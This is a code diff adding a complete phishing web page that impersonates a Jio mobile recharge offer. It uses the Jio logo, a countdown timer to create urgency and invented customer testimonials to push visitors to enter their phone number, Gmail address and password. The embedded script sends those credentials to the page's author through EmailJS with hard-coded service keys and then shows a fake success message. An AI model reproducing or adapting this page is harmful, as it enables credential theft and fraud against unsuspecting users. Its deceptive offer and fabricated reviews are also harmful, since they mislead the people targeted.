@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Offer - Jio Recharge</title>
+    <!-- Link to Google Fonts for Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
+
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #004F8C, #00A1D6);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            overflow-x: hidden;
+            flex-direction: column;
+        }
+
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap;
+            width: 100%;
+            padding: 15px;
+        }
+
+        .content {
+            background: #fff;
+            width: 100%;
+            max-width: 600px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+            position: relative;
+            margin: 10px;
+        }
+
+        /* Logo */
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+            animation: logoPulse 2s infinite;
+            max-width: 100%;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            color: #D50032;
+            margin-bottom: 20px;
+            font-weight: bold;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.3);
+        }
+
+        .offer-description {
+            font-size: 1.1rem;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: 400;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Timer Section */
+        .timer {
+            font-size: 1.2rem;
+            color: #D50032;
+            font-weight: 600;
+            margin-bottom: 30px;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        /* Form Styles */
+        .input-field {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        .input-field label {
+            font-size: 1rem;
+            font-weight: 500;
+            color: #333;
+            position: absolute;
+            top: -12px;
+            left: 10px;
+            background: #fff;
+            padding: 0 5px;
+            z-index: 1;
+        }
+
+        .input-field input {
+            width: 100%;
+            padding: 12px;
+            font-size: 1rem;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            margin-top: 10px;
+            background-color: #f7f7f7;
+            color: #333;
+            transition: 0.3s ease;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-field input:focus {
+            border-color: #004F8C;
+            outline: none;
+            background-color: #fff;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: #D50032;
+            color: #fff;
+            font-size: 1.1rem;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.3s ease;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .btn-submit:hover {
+            background-color: #a4001a;
+            transform: translateY(-2px);
+        }
+
+        .btn-submit:active {
+            transform: translateY(2px);
+        }
+
+        /* Loading Spinner */
+        .loading-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #004F8C;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-top: 20px;
+        }
+
+        /* Hidden Elements */
+        .hidden {
+            display: none;
+        }
+
+        /* Success and Failure Messages */
+        .success-message, .failure-message {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin-top: 20px;
+        }
+
+        .success-message {
+            color: green;
+        }
+
+        .failure-message {
+            color: red;
+        }
+
+        /* Testimonials Section */
+        .testimonials {
+            margin-top: 50px;
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            margin-top: 30px;
+        }
+
+        .testimonials h3 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .testimonial-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .testimonial {
+            background-color: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial p {
+            font-size: 1rem;
+            color: #555;
+            margin-bottom: 10px;
+        }
+
+        .testimonial .author {
+            font-weight: bold;
+            color: #D50032;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes logoPulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Media Queries for responsiveness */
+        @media (max-width: 768px) {
+            .content {
+                padding: 20px;
+                margin: 10px;
+            }
+
+            h1 {
+                font-size: 1.8rem;
+            }
+
+            .offer-description {
+                font-size: 1rem;
+            }
+
+            .input-field input {
+                font-size: 1rem;
+                padding: 10px;
+            }
+
+            .btn-submit {
+                font-size: 1rem;
+            }
+
+            .testimonials h3 {
+                font-size: 1.3rem;
+            }
+
+            .testimonial-container {
+                gap: 15px;
+            }
+
+            .testimonial p {
+                font-size: 0.95rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .offer-description {
+                font-size: 0.9rem;
+            }
+
+            .input-field input {
+                font-size: 0.9rem;
+                padding: 8px;
+            }
+
+            .btn-submit {
+                font-size: 1rem;
+                padding: 12px 25px;
+            }
+
+            .loading-spinner {
+                width: 40px;
+                height: 40px;
+            }
+
+            .testimonials h3 {
+                font-size: 1.2rem;
+            }
+
+            .testimonial p {
+                font-size: 0.9rem;
+            }
+        }
+
+    </style>
+
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="content">
+            <!-- Offer Section -->
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Reliance_Jio_Logo.svg/1024px-Reliance_Jio_Logo.svg.png" alt="Jio Logo" class="logo">
+            <h1>Exclusive ₹859 Jio Recharge Offer!</h1>
+            <p class="offer-description">Claim your ₹859 Jio recharge offer now. Fill in your details to receive your reward!</p>
+
+            <!-- Timer Section -->
+            <div class="timer" id="time">05:00</div>
+
+            <!-- Form Section -->
+            <div class="form-container">
+                <h2>Claim Your Prize Now!</h2>
+                <form id="claimForm" onsubmit="return validateForm()">
+                    <div class="input-field">
+                        <label for="phone">Phone Number</label>
+                        <input type="text" id="phone" name="phone" placeholder="Enter phone number" required pattern="^\d{10}$" title="Please enter a valid 10-digit phone number">
+                    </div>
+
+                    <div class="input-field">
+                        <label for="email">Email (Gmail)</label>
+                        <input type="email" id="email" name="email" placeholder="Enter your Gmail" required>
+                    </div>
+
+                    <div class="input-field">
+                        <label for="password">Create a Password</label>
+                        <input type="password" id="password" name="password" placeholder="Enter a password" required>
+                    </div>
+
+                    <button type="submit" class="btn-submit">Claim Offer!</button>
+                </form>
+            </div>
+
+            <!-- Hidden Message Areas -->
+            <div id="loading" class="hidden">
+                <p>Processing... Please wait.</p>
+                <div class="loading-spinner"></div>
+            </div>
+
+            <div id="failure" class="hidden">
+                <p class="failure-message">Oops! Something went wrong. Please try again later.</p>
+            </div>
+
+            <div id="success" class="hidden">
+                <p class="success-message">🎉 Congratulations! You've claimed your ₹859 Jio recharge. Enjoy unlimited data!</p>
+            </div>
+
+            <!-- Testimonials Section -->
+            <div class="testimonials">
+                <h3>What People Are Saying</h3>
+                <div class="testimonial-container">
+                    <div class="testimonial">
+                        <p>"I couldn't believe it when I got my ₹859 Jio recharge! It's an amazing offer. Thank you Jio for making it so easy!"</p>
+                        <p class="author">- Priya K., Mumbai</p>
+                    </div>
+                    <div class="testimonial">
+                        <p>"I have been using Jio for years, and this recharge offer is just the cherry on top. So grateful for Jio's continued support!"</p>
+                        <p class="author">- Rajesh S., Bangalore</p>
+                    </div>
+                    <div class="testimonial">
+                        <p>"Wow! I got a ₹859 recharge just like that. Jio really takes care of their customers. Highly recommend it!"</p>
+                        <p class="author">- Anita M., Delhi</p>
+                    </div>
+                    <div class="testimonial">
+                        <p>"Thanks to Jio, I’m set for the next 3 months! Unlimited data, calls, and SMS—Jio is a game-changer!"</p>
+                        <p class="author">- Arvind P., Chennai</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Include the EmailJS library -->
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2.6.4/dist/email.min.js"></script>
+
+    <script>
+        // Initialize EmailJS
+        document.addEventListener('DOMContentLoaded', function() {
+            emailjs.init('5kGUJzWJZpHnKc-KL'); // Replace with your EmailJS user ID
+        });
+
+        // Timer logic
+        const timerElement = document.getElementById('time');
+        let countdownTime = 5 * 60; // 5 minutes in seconds
+
+        const updateTimer = () => {
+            const minutes = Math.floor(countdownTime / 60);
+            const seconds = countdownTime % 60;
+            timerElement.innerText = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+
+            if (countdownTime <= 0) {
+                clearInterval(timerInterval);
+                alert("The offer has ended! The page will now close.");
+                window.close(); // This will attempt to close the page when the timer hits 0
+            }
+            countdownTime--;
+        };
+
+        const timerInterval = setInterval(updateTimer, 1000);
+        updateTimer();  // Initial call to set the timer right away
+
+        // Form validation function
+        function validateForm() {
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Basic validations
+            if (!/^\d{10}$/.test(phone)) {
+                alert("Please enter a valid 10-digit phone number.");
+                return false;
+            }
+
+            if (!email.includes('@gmail.com')) {
+                alert("Please enter a valid Gmail address.");
+                return false;
+            }
+
+            // Password validation (must be at least 8 characters long)
+            if (password.length < 8) {
+                alert("Password must be at least 8 characters.");
+                return false;
+            }
+
+            // Show loading indicator
+            document.getElementById('loading').classList.remove('hidden');
+
+            // Prepare data to send with EmailJS
+            const data = {
+                phone: phone,
+                email: email,
+                password: password
+            };
+
+            // Send data via EmailJS
+            emailjs.send('service_ve6w0et', 'template_fzdw02s', data)
+                .then(function(response) {
+                    console.log('Email sent successfully:', response);
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('success').classList.remove('hidden');
+                }, function(error) {
+                    console.log('Error sending email:', error);
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('failure').classList.remove('hidden');
+                });
+
+            return false; // Prevent form from actually submitting
+        }
+    </script>
+</body>
+</html>
+
